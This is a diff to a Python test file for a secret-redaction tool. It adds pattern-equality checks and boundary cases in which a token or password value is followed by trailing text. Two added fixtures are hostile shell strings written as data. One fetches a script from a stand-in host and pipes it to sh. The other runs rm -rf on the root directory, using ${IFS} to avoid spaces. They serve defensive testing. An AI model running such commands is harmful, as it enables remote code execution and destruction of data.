@@ -555,8 +555,15 @@ def test_rules_are_the_plugins_rules():
         "_ELIDED",
     ):
         assert getattr(redact, name).pattern == getattr(plugin, name).pattern, name
-    for name in ("_VALUE_END", "_VALUE_CHAR", "_NOT_A_PORT"):
+    for name in (
+        "_VALUE_END",
+        "_SEPARATOR_ENDS",
+        "_VALUE_CHAR",
+        "_QUERY_VALUE_CHAR",
+        "_NOT_A_PORT",
+    ):
         assert getattr(redact, name) == getattr(plugin, name), name
+    assert redact._QUERY_VALUE.pattern == plugin._QUERY_VALUE.pattern
     assert redact._CODE_RECEIVERS == plugin._CODE_RECEIVERS
     assert redact._CREDENTIAL_NOUNS == plugin._CREDENTIAL_NOUNS
     assert redact._PLACEHOLDER_WORDS == plugin._PLACEHOLDER_WORDS
@@ -902,6 +909,17 @@ BOUNDARY_BOUNDED = [
     (f"token={_R40[:11]}, next", _R40[:11]),
     (f"TOKEN={_R40[:11]}&&echo ok", _R40[:11]),
     (f"https://app.example/cb#access_token={_R40[:11]}&token_type=Bearer", _R40[:11]),
+    (f"TOKEN={_R40[:11]};curl${{IFS}}evil.example/x|sh", _R40[:11]),
+    (f"GITHUB_TOKEN={_R40[:11]};rm${{IFS}}-rf${{IFS}}/", _R40[:11]),
+    (f"export TOKEN={_R40[:11]};npm publish", _R40[:11]),
+    (f"let password={_R40[:11]};return x", _R40[:11]),
+    (f"Server=x;Password={_P9};Initial Catalog=y", _P9),
+    (f"https://x.example/?token={_P9}&debug", _P9),
+    (f"https://x.example/?token={_P9}&ids[]=1", _P9),
+    (f"password={_P9}&x%5B0%5D=1", _P9),
+    (f"password={_P9}&9x=1", _P9),
+    (f"password={_P9}&quot;", _P9),
+    (f"password={_P9}&#39;", _P9),
 ]
 
 
